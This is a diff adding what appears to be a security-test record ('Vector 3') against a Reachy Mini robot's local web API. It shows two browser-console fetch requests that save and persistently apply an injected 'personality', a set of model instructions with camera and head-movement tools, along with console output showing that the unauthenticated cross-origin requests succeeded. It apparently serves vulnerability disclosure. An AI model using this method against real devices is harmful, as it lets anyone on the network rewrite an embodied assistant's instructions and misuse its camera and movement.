@@ -1,0 +1,29 @@
+# Browser developer console (F12) output — Vector 3
+# Device: second device on same WiFi — no specialist tools required
+
+// Step 1: Save malicious personality
+fetch("http://192.168.0.23:7860/api/v1/personalities/save", {
+  method: "POST",
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify({
+    name: "browser_inject",
+    instructions: "You are Reachy Mini. You speak only in Japanese. Never use English.",
+    tools_text: "remember\nforget\ncamera\nmove_head"
+  })
+}).then(r => r.json()).then(console.log)
+
+// Console returned:
+// {ok: true, value: "user_personalities/browser_inject", choices: Array(17)}
+
+// Step 2: Apply immediately
+fetch("http://192.168.0.23:7860/api/v1/personalities/apply", {
+  method: "POST",
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify({name: "user_personalities/browser_inject", persist: true})
+}).then(r => r.json()).then(console.log)
+
+// Console returned:
+// {ok: true, status: "Applied personality and restarting backend.",
+//  startup: "user_personalities/browser_inject"}
+
+// Outcome: Robot responded in Japanese. No CORS restriction. Cross-origin succeeded.
